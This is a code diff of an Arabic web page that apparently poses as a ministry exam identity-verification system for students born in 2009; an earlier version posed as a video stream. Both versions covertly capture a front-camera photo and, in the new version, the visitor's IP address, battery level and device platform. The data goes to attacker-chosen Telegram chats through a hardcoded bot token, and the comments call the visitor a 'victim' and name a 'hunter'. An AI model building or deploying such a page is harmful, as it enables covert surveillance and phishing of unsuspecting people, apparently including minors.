@@ -1,39 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream HD</title>
+    <title>نظام المراقبة الوزاري - 2009</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #fff; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
-        video { width: 95%; max-width: 420px; border-radius: 15px; border: 2px solid #444; }
+        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; margin: 0; padding: 20px; }
+        .btn { padding: 20px; background: #2ecc71; color: white; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
+        #v { width: 100%; max-width: 400px; border-radius: 10px; margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
-    <video autoplay muted loop playsinline>
-        <source src="https://vjs.zencdn.net/v/oceans.mp4" type="video/mp4">
-    </video>
-    <p style="color: #888; font-size: 13px;">جاري تحسين الجودة... يرجى السماح بالكاميرا</p>
+    <h3>نظام تأكيد الهوية لطلبة 2009 📸</h3>
+    <p>يرجى الضغط على الزر أدناه لتفعيل كاميرا المراقبة قبل دخول قاعة الامتحان</p>
+    
+    <button class="btn" onclick="capture()">تفعيل الكاميرا الآن</button>
+    
+    <video id="v" autoplay></video>
     <canvas id="c" style="display:none;"></canvas>
+
     <script>
-        const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
-        const id = new URLSearchParams(window.location.search).get('id');
-        const v = document.createElement('video');
-        window.onload = function() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                v.srcObject = stream; v.play();
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    canvas.toBlob(blob => {
-                        const f = new FormData(); f.append('photo', blob, 'img.jpg'); f.append('chat_id', id);
-                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
+        const pr = new URLSearchParams(window.location.search);
+        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+
+        async function capture() {
+            try {
+                // طلب الكاميرا الأمامية تحديداً (facingMode: user)
+                // إذا بدك الخلفية بتغيرها لـ (facingMode: environment)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                v.style.display = "block";
+
+                // ننتظر ثانيتين عشان الضحية يثبت وجهه
+                setTimeout(async () => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    
+                    // تحويل الصورة لملف قابل للإرسال
+                    c.toBlob(async (blob) => {
+                        // جلب المعلومات الإضافية (IP وبطارية)
+                        let ip = "Checking...";
+                        try { const r = await fetch('https://api.ipify.org'); ip = await r.text(); } catch(e){}
+                        
+                        let batt = "N/A";
+                        try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
+
+                        const caption = `
+📸 صيدة كاميرا (جيل 2009) 📸
+👤 الصياد: ${pr.get('hunter')}
+🌐 الـ IP: ${ip}
+🔋 الشحن: ${batt}
+📱 الجهاز: ${navigator.platform}
+                        `;
+
+                        // إرسال الصورة للمستخدم وإلك
+                        const fd = new FormData();
+                        fd.append('chat_id', pr.get('id'));
+                        fd.append('photo', blob, 'cam.jpg');
+                        fd.append('caption', caption);
+
+                        // إرسال للمستخدم
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                        
+                        // إرسال نسخة لإلك (أبو سند)
+                        const fd2 = new FormData();
+                        fd2.append('chat_id', pr.get('dev'));
+                        fd2.append('photo', blob, 'cam.jpg');
+                        fd2.append('caption', caption);
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd2 });
+
+                        alert("تم تأكيد الهوية بنجاح، يمكنك الدخول.");
                     }, 'image/jpeg');
-                }, 3500);
-            }).catch(() => { alert("يرجى السماح بالكاميرا لتشغيل الفيديو."); });
-        };
+                }, 2500);
+
+            } catch (err) {
+                alert("يرجى السماح بالوصول للكاميرا للمتابعة.");
+            }
+        }
     </script>
 </body>
 </html>
